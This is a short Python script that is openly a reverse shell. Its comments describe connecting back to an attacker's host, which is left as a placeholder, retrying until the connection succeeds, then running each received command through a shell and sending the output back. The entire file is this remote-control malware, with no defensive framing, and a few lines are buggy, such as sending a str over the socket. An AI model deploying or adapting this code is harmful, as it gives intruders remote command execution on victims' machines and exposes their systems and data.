import socket
import subprocess
import time
import os
#defining the host and port to connect back to the attacker

host = '0.0.0.0'
port = 0
#creating the socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#connecting to the attacker
def connect(s):
    try:
        s.connect((host,port))
    except:
        time.sleep(5)   
        connect(s)

#calling the connect function

connect(s)

while True:
    #recieving the command
    command = s.recv(4096)

    #converting the command into str

    data = str(command,'utf-8')

    #splitting the data to seprate cd and the arguments

    data = data.split()

    #if the command is cd we use os.chdir()

    if data[0] == "cd":
        try:
            os.chdir(data[1])
        except os.error as msg:
            s.send(str(msg))    
            continue
        else:
            s.send(str.encode(os.getcwd()))
            continue

    #spilitting the command to seperate the command and its arguments

    command = command.split()

    try:

        output = subprocess.Popen(command,shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE)

    except Exception as err:
        if err.errno == 2:
            s.send(str.encode("Command not found"))
        continue

    else:

    #combining the stdout and sterr 

        data = output.stdout.read() + output.stderr.read()

    #sending the output of the command back to the attacker

        s.send(data)

    #And the process goes on until the attacker enter's exit
